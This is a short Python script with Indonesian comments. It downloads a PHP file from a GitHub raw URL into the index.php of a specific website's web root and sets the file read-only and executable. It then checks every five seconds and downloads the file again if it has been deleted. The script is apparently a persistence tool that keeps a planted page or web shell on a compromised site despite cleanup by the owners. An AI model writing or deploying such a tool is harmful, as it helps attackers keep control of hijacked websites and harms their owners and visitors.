import os
import time
import urllib.request

#  =======================================================================================
file_path = '/var/www/u0453969/data/www/autoprogress-m.ru/index.php'

#  ======================================================================================
src_url = 'https://raw.githubusercontent.com/xxTYPOxx/index/refs/heads/main/autoprogress-m.ruwi.php'

def fetch_file(url, destination):
    """
    Mengunduh file dari URL dan menyimpannya di lokasi yang ditentukan.
    Mengubah izin file menjadi 555 (read and execute).
    """
    try:
        # =================================================================================
        urllib.request.urlretrieve(url, destination)
        # Mengubah izin file menjadi 555 (read and execute)
        os.chmod(destination, 0o555)
    except Exception as e:
        #  =================================================================================
        print(f"Error fetching file: {e}")

#  =========================================================================================
if not os.path.exists(file_path):
    fetch_file(src_url, file_path)

#  =========================================================================================
while True:
    time.sleep(5)  # Tunggu selama 5 detik sebelum memeriksa kembali
    if not os.path.exists(file_path):
        fetch_file(src_url, file_path)  # Mengunduh file jika tidak ada

         #python3 --version
        #python3 fetch_file.py
